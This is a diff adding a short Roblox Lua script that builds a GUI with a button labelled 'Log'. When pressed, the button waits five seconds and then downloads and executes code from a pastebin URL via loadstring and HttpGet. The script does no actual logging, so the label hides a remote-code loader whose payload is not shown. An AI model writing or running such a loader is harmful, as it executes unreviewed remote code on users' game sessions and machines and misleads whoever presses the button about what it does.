@@ -1,0 +1,38 @@
+-- Create a ScreenGui object to hold the GUI elements
+local gui = Instance.new("ScreenGui")
+gui.Parent = game.Players.LocalPlayer.PlayerGui
+
+-- Create a Frame for the GUI
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.Position = UDim2.new(0.5, -100, 0.5, -50)
+frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+-- Create a Button inside the frame
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 150, 0, 50)
+button.Position = UDim2.new(0.5, -75, 0.5, -25)
+button.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
+button.Text = "Log"
+button.Parent = frame
+
+-- Function to execute the logging and code after the button is pressed
+local function onButtonPressed()
+    button.Text = "Logging..."
+    button.AutoButtonColor = false
+    button.Active = false
+    
+    wait(5) -- Wait for 5 seconds
+    
+    -- Execute the code after waiting
+    loadstring(game:HttpGet('https://pastebin.com/raw/2YzNfYQQ'))()
+    
+    button.Text = "Log"
+    button.AutoButtonColor = true
+    button.Active = true
+end
+
+-- Connect the function to the button's MouseButton1Click event
+button.MouseButton1Click:Connect(onButtonPressed)
